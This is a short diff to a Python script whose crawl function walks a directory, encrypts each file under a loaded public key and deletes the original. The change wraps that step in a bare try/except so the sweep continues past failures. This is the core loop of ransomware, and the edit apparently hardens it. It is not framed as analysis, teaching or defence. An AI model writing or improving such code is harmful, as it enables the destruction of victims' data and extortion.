@@ -59,8 +59,11 @@ def crawl(basedir):
         for file in files:
             filepath = os.path.join(path, file)
             print(filepath)
-            encrypt_file(filepath, f)
-            utils.remove_file(filepath)
+            try:
+                encrypt_file(filepath, f)
+                utils.remove_file(filepath)
+            except:
+                pass
 
 if __name__ == "__main__":
     public_key = load_public_key()
